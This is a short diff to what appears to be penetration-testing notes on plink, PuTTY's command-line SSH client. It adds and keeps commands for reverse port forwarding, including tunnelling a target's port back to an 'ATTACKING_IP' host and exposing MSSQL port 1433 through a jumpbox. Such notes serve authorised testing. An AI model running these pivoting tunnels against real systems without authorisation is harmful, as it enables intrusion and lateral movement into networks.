@@ -1,5 +1,7 @@
 ## It's a windows command line version of the PuTTY SSH client.
 
+    .\plink.exe -ssh -l USER -pw PASSWORD -R 1433:127.0.0.1:1433 -hostkey KEY_SIGNATURE JUMPBOX_IP
+
 ### cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N
 
 ### Convert keys with puttygen: puttygen KEY -o KEY.ppk
